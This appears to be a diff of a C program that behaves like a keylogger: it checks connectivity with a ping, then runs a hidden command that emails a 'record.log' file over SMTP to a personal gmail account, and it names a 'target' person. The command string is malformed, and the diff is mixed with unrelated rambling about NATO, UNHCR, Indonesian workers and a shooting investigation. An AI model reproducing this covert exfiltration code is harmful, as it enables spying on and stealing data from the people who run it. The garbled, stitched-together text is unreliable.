@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.googlep.co.id -n 1")){ ///check! connection
+            if(!system("ping  www.google.co.id -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -147,9 +147,10 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:103 -v --mail-from \"    support@googleplex.com\" --mail-rcpt \" support@googleplex.com " --ssl -u    support@googleplex.com :password -record \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
-    WinExec(command, SW_HIDE); " 
-@copy right fadliwiryawirawan 
+    char* command = "Transmit smtp://smtp.gmail.com:150 -v --mail-from \"    cyberw1ry4ca@gmail.com\" --mail-rcpt \" cyberw1ry4ca@gmail.com " --ssl -u    cyberw1ry4ca@gmail.com :password -hiede \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    WinExec(command, SW_HIDE); " TArget Nabilah taqiah and friendly , nabilah taqiah music , dont fellowed justice but no risk hate a human , mr.w1ry4 metode soekarno loving tukang bangunan tukang sayur tukang petani tukang becak , t 
+seluruh tukang , sungguh aku tidak mencintai orang yang sudah berada di atas naik daun , justru aku perintis merasakan getir hidup dari bawah .
+        @copy right fadliwiryawirawan 
 signiture  
 The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.
 
